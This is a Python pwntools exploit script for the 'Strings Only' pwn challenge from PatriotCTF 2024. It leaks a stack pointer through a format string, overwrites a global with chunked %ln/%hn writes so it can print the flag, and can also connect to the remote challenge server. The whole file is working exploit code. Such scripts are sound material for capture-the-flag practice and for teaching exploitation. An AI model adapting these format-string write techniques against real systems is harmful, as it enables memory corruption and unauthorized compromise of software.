#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/PatriotCTF 2024/pwn/Strings Only/bin/strings_only')
elf = ELF(TARGET)

def malloc(r, c):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', str(c).encode())

def write(r, i, s):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(i).encode())
    r.sendlineafter(b'> ', flat(s))

def read(r, i):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', str(i).encode())

    return r.recvline()

def free(r, i):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', str(i).encode())

def print_flag(r):
    r.sendlineafter(b'> ', b'5')

    print(r.recv())

def write_byte(r, index, target, value, offsets):
    for i in range(4):
        write(r, index, flat(f'%{target}c%{offsets[0]}$ln'))
        read(r, index)

        if value & 0xffff != 0:
            write(r, index, flat(f'%{value & 0xffff}c%{offsets[1]}$hn'))
        else:
            write(r, index, flat(f'{offsets[1]}$hn'))

        read(r, index)

        target += 2
        value >>= 0x10


def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    for i in range(2):
        malloc(r, 0x400)

    write(r, 1, b'%15$p')

    key = int(read(r, 1).decode(), 16) - 0xf0

    write_byte(r, 1, elf.sym.strings, key, [15, 41])
    write(r, 0, p64(0xcafebabe))
    print_flag(r)
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('chal.competitivecyber.club', 8888)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
